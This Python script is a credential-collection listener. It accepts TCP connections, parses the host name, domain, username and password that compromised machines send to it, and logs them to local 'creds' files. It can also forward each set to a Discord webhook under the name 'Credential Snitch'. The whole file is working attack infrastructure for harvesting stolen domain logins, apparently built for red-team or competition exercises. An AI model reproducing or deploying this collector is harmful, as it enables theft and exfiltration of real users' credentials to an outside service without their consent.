#!/usr/bin/env python3
import socket
import threading
import datetime
import argparse
import os
import datetime
import requests

def connection(conn, addr, args):
    data = conn.recv(2048).decode('ascii', errors='ignore').split("\r\n", 4)
    if len(data) != 5:
        print(f'malformed connection {data}')
        return

    ip = addr[0]
    fqdn = data[0]
    domain = data[1]
    username = data[2]
    password = data[3]
    extra = data[4]

    for string in [fqdn, domain, username, password, extra]:
        string.replace("\n", "").replace("\r", "")

    timestamp = datetime.datetime.now().strftime("%m/%d %I:%M:%S")

    print(f'{timestamp} {extra}\n{fqdn} {ip}\nd:"{domain}" u:"{username}" p:"{password}"\n')

    if args.discord != "":
        data = {
            "content" : f"{timestamp} {extra}\n{fqdn} {ip}\n`{domain}` `{username}` `{password}`\n",
            "username" : "Credential Snitch",
            # "avatar_url" : "https://media.discordapp.net/attachments/1101174538550657085/1104529143556747284/hpcc_logo_red.png"
        }
        requests.post(args.discord, json=data)

    if args.write == True:
        with open(os.path.join("creds", fqdn), "a") as f:
            f.write(f"{timestamp} {extra} {fqdn} {ip} {domain} {username} {password}\n")

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", type=str, nargs="?", help="ip to listen on", default="0.0.0.0")
    parser.add_argument("--port", type=int, nargs="?", help="port to listen on", default=8080)
    parser.add_argument("--discord", type=str, nargs="?", help="discord webhook url", default="")
    parser.add_argument("--write", action="store_true", help="file output", default=False)
    return parser.parse_args()

if __name__ == '__main__':
    args = get_args()
    if args.write:
        os.system("mkdir -p creds")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.ip, args.port))
        s.listen(100)
        print(f"Listening on {args.ip}:{args.port}\n")

        try:
            while True:
                conn, addr = s.accept()
                threading.Thread(target=connection, args=(conn, addr, args)).start()
        except KeyboardInterrupt:
            s.close()
            exit(0)

